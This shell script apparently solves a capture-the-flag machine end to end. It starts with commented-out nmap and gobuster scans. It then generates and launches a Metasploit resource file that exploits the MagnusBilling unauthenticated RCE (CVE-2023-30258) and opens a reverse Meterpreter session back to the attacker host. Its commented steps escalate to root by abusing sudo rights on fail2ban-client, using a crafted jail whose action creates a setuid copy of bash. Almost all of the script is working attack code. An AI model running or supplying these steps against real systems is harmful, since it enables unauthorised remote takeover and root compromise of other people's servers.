#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.108.89"
attack_ip="10.6.45.13"
result_folder="/media/psf/Home/Work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
#nmap -p- -Pn -sC -sV -A -sS -T5 ${target_ip} > $result_folder/nmap-results.txt
#gobuster dir -u http://$target_ip -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories.txt

echo "2 - EXPLOITATION"
echo "use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258" > $result_folder/metasploit.rc
echo "set RHOSTS $target_ip" >> $result_folder/metasploit.rc
echo "set RPORT 80" >> $result_folder/metasploit.rc
echo "set LHOST $attack_ip" >> $result_folder/metasploit.rc
echo "set LPORT 4444" >> $result_folder/metasploit.rc
echo "exploit" >> $result_folder/metasploit.rc
msfconsole -r $result_folder/metasploit.rc

# Once meterpreter session is open, get user flag under /home/magnus/user.txt
# sudo -l gives fail2ban-client with sudo rights, then :

# --> Create environment for fail2ban
# mkdir /tmp/fjb/
# mkdir /tmp/fjb/jail.d/
# mkdir /tmp/fjb/filter.d/
# mkdir /tmp/fjb/action.d/

# --> Create evil.conf
# cat << 'EOF' > /tmp/fjb/jail.d/evil.conf
# [evil]
# enabled = true
# filter = fake
# logpath = /tmp/evil.log
# action = ownbash
# bantime = -1
# EOF

# --> Create jail.conf
# cat << 'EOF' > /tmp/fjb/jail.conf
# [INCLUDES]
# before = jail.d/*.conf
# EOF

# --> Create fail2ban.conf
# cat << 'EOF' > /tmp/fjb/fail2ban.conf
# [Definition]
# loglevel = INFO
# logtarget = /tmp/fjb/fail2ban.log
# socket = /tmp/fjb/fail2ban.sock
# pidfile = /tmp/fjb/fail2ban.pid
# EOF

# --> Create evil.log
# touch /tmp/evil.log

# --> Create fake.conf
# cat << 'EOF' > /tmp/fjb/filter.d/fake.conf
# [Definition]
# failregex = <HOST> .*
# ignoreregex =
# EOF

# --> Create ownbash.conf
# cat << 'EOF' > /tmp/fjb/action.d/ownbash.conf
# [Definition]
# actionstart = /bin/bash -c “rm -f /home/magnus/rootbash && cp /bin/bash /home/magnus/rootbash && chmod 4755 /home/magnus/rootbash"
# actionstop =
# actioncheck =
# EOF

# --> Exploit
# rm -f /tmp/fjb/fail2ban.pid /tmp/fjb/fail2ban.sock
# sudo fail2ban-client -c /tmp/fjb start
# echo "192.168.1.123 attack" >> /tmp/evil.log
# /home/magnus/rootbash -p